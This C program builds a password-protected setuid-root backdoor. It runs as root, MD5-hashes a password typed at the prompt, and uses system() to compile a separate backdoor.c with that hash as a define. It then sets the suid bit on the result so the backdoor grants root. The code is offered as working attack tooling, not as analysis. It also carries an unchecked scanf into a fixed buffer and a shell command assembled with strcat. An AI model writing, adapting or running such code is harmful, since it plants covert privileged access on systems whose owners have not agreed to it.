#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/md5.h>

int main(void) {
        int olduid=500;
        olduid=getuid();
        setuid(0);
	char inpass[128];
	char gccomand[512] = "";

        if(getuid()){
                printf("must be suid root.\n");
        } else {
		printf("Please type a password for the backdoor: ");
		scanf("%s",inpass);
		mysum(inpass);
		printf("The hash is: %s\n", inpass);
		printf("Now building backdoor.c\n");

		strcat(gccomand, "gcc -lcrypto -D PASSWORD=\\\"");
		strcat(gccomand, inpass);
		strcat(gccomand, "\\\" backdoor.c -o backdoor");
		printf("%s\n",gccomand);
                system(gccomand);

		printf("Setting suid bit\n");
		system("chmod u+s backdoor");
		printf("Done!\n");
        }
        return 0;
}

int mysum(char *password)
{
	int i;
	int n;
	unsigned char result[MD5_DIGEST_LENGTH];
	char md5out[33];

	MD5(password, strlen(password), result);

	n = 0;
	for(i=0;i<MD5_DIGEST_LENGTH;i++)
	{
		//fprintf(fp,"%02x",result[i]);
		sprintf(&md5out[n], "%02x", result[i]);
		n = n + 2;
		printf("%02x",result[i]);
	}
	strcpy(password, md5out);
	printf("\n");

	return;
}
